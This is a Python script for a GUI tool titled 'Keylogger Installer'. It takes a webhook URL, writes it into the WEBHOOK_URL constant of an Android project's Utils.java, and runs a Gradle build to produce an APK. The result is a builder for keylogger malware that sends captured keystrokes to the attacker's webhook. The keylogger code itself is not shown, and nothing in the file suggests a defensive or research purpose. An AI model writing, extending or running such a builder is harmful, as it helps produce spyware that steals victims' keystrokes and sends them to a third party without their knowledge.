import subprocess
import os
import threading
import ttkbootstrap as ttk

def install():
    thread = threading.Thread(target=run_build_process)
    thread.start()

def run_build_process():
    webhook_url = entry.get()
    file_path = "app/src/main/java/com/Utils.java"

    try:
        with open(file_path, "r") as file:
            lines = file.readlines()

        new_lines = []
        for line in lines:
            if "private static final String WEBHOOK_URL" in line:
                line = f'    private static final String WEBHOOK_URL = "{webhook_url}";\n'
            new_lines.append(line)

        with open(file_path, "w") as file:
            file.writelines(new_lines)

        status_label.config(text="Building APK...", foreground="yellow")
        progress_bar.start(10)

        result = subprocess.run(
            ["gradlew.bat", "assembleDebug"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=os.getcwd()
        )

        progress_bar.stop()

        if result.returncode == 0:
            status_label.config(text="✅ APK built successfully!", foreground="green")
            open_apk_folder()
        else:
            status_label.config(text="❌ APK build failed!", foreground="red")

    except Exception as e:
        progress_bar.stop()  # Ensure progress bar stops even if there's an error
        status_label.config(text=f"⚠️ Error: {e}", foreground="orange")

def open_apk_folder():
    apk_path = os.path.join(os.getcwd(), "app", "build", "outputs", "apk", "debug")
    
    # Open the folder in File Explorer
    subprocess.Popen(f'explorer {apk_path}')
    
# Create main window
root = ttk.Window(themename="darkly")
root.title("Keylogger Installer")
root.geometry("500x250")
root.resizable(False, False)

# Title Label
ttk.Label(root, text="🔷 Keylogger Installer", font=("Arial", 16, "bold")).pack(pady=10)

# Webhook URL input
frame = ttk.Frame(root)
frame.pack(pady=5)

ttk.Label(frame, text="Enter Webhook URL:", font=("Arial", 12)).grid(row=0, column=0, padx=5)
entry = ttk.Entry(frame, width=40)
entry.grid(row=0, column=1, padx=5)

# Build Button
build_button = ttk.Button(root, text="🔨 Build APK", bootstyle="primary", command=install)
build_button.pack(pady=10)

# Progress Bar
progress_bar = ttk.Progressbar(root, mode="indeterminate", bootstyle="info")
progress_bar.pack(fill="x", padx=20, pady=5)

# Status Label
status_label = ttk.Label(root, text="", font=("Arial", 10))
status_label.pack(pady=5)

root.mainloop()